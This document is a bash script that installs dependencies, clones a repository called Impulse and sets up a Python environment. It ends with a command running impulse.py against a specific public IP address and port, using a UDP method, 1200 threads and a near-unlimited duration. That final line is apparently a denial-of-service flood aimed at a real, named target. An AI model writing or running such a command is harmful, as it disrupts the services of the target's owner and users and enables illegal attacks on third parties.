#!/bin/bash

# 1. Update and install system dependencies
sudo apt update
sudo apt install -y python3 python3-pip python3-venv git build-essential

# 2. Clone the repository
if [ ! -d "Impulse" ]; then
    git clone https://github.com/LimerBoy/Impulse
fi
cd Impulse/

# 3. Set up a Virtual Environment
# This avoids the "externally-managed-environment" error correctly
python3 -m venv venv
source venv/bin/activate

# 4. Install requirements inside the virtual environment
pip install --upgrade pip
if [ -f "requirements.txt" ]; then
    pip install -r requirements.txt
else
    echo "requirements.txt not found."
fi

echo "Setup complete. To run the script, use: python3 impulse.py [args]"
py impulse.py --target 40.160.20.9:16261 --method UDP --time 99999999 --threads 1200
